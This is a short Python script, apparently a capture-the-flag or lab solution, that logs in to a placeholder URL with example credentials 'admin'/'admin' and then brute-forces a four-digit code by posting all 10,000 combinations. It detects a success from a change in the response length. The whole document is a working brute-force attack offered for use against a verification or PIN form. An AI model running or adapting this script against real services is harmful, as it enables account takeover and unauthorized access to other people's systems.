import requests

url = "URL"
s = requests.Session()
data = {"username": "admin", "password": "admin"} #for example
login_response = s.post(url, data=data)
print(login_response.text)
 
for x1 in range (0, 10):
    for x2 in range (0, 10):
        for x3 in range (0, 10):
            for x4 in range (0,10):
                data_code = {"num1":x1, "num2":x2, "num3":x3, "num4":x4}
                answer = s.post(url, data=data_code)
                print(x1, x2, x3, x4)
                print(len(answer.content))
                if len(answer.content) != 2480: #check response conditions
                    print("STOOOOP", x1, x2, x3, x4)
